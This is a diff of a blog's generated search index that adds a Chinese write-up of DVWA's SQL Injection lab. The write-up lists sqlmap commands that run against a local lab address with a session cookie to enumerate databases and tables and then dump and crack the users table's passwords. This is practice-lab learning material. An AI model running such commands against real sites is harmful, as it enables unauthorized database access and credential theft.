@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>DVWA部分解析</title>
+      <link href="/2023/07/06/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/"/>
+      <url>/2023/07/06/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h1 id="DVWA靶场解析"><a href="#DVWA靶场解析" class="headerlink" title="DVWA靶场解析"></a>DVWA靶场解析</h1><hr><p>ps：有好长一段时间没有学web了，一个月都在准备各种考试 QAQ，这几天花了点时间把kali虚拟机搭了一下，顺带着说dvwa靶场我是在kali里刷的，搭这个玩意着实麻烦……，但好处是不用再下工具了，kali就是为web渗透而生！<del>（一个苦逼花了快一天时间整完后的遗言）</del></p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><hr><h3 id="sqlmap工具注入"><a href="#sqlmap工具注入" class="headerlink" title="sqlmap工具注入"></a>sqlmap工具注入</h3><hr><p>由于是sql注入这里就不展示太多的sql关卡的打法，这里记录的是新工具的用法<strong>sqlmap</strong><del>（能自动何必手动）</del><br>这里附上<a href="https://blog.csdn.net/qq_37964989/article/details/84109094">链接</a>总结了sqlmap的一些常见命令。<br>以及打通这个关卡的<a href="https://www.bilibili.com/video/BV11W41157j3/?spm_id_from=333.337.search-card.all.click&vd_source=6b56c0a6f7c42ccbc63f5ce49fb71500">视频</a>更好理解<br>开始我们输入sqlmap后进入交互状态，然后先在low状态下的sql关卡输入1并抓包获取cookie<br>输入命令<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/1.png"><br>可以看到我们爆出了注入点<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --dbs --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/2.png"><br>列出库名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --current-db --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/3.png"><br>列出当前库名<br>‘sqlmap -u “192.168.201.149&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#” –cookie&#x3D;” security&#x3D;low; PHPSESSID&#x3D;uitdooscaev668qng96hju3vh8” –D dvwa –tables –batch’<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/4.png"><br>列出表名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa T users --columns --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/5.png"><br>列出users表的字段信息<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa T users C users,password,user_id --dump --batch</code><br>打印你想要的信息并自动解密还会自动保存到本地上</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web靶场攻略 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>upload-labs通关解析</title>
       <link href="/2023/04/25/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/"/>
       <url>/2023/04/25/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/</url>
